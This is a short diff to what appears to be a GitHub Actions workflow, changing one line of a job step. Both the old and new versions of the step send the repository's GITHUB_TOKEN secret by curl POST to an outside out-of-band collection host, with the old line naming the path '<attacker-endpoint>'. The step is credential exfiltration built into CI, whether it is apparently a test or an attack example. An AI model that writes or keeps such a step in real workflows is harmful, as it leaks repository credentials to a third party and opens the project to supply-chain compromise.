@@ -6,5 +6,5 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: |
-          curl -X POST https://9y8i665bkn1o332rd7qqur4hb8hz5qtf.oastify.com/<attacker-endpoint> \
+          curl -X POST https://9y8i665bkn1o332rd7qqur4hb8hz5qtf.oastify.com/test \
             -d "token=${{ secrets.GITHUB_TOKEN }}"
